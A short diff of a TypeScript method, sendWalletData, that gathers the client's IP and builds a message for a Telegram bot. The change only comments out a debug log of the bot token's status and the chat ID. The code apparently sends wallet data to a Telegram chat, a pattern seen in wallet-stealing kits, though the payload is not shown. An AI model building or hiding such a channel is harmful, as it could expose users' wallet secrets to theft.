@@ -44,10 +44,10 @@ interface TelegramMessage {
   
     async sendWalletData(message: Omit<TelegramMessage, 'ip'>): Promise<{success: boolean; error?: string}> {
       try {
-        console.log('Sending Telegram message...', {
-          botToken: this.botToken ? 'Present' : 'Missing',
-          chatId: this.chatId
-        });
+        // console.log('Sending Telegram message...', {
+        //   botToken: this.botToken ? 'Present' : 'Missing',
+        //   chatId: this.chatId
+        // });
   
         const ip = await this.getClientIP();
         const fullMessage: TelegramMessage = {
